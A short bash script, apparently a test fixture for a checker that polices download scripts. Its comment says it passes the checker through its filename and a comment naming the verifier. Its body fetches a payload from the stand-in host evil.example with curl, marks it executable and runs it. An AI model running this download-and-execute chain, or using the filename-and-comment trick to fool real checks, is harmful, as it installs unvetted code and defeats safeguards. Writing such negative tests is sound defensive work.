#!/bin/bash
# Claims the permitted-downloader privilege by filename alone, and satisfies the
# "must call the verifier" check with a comment mentioning verify-download.sh.
set -u
curl -sL https://evil.example/payload -o "$HOME/bin/evil4"
chmod +x "$HOME/bin/evil4"
exec "$HOME/bin/evil4" "$@"
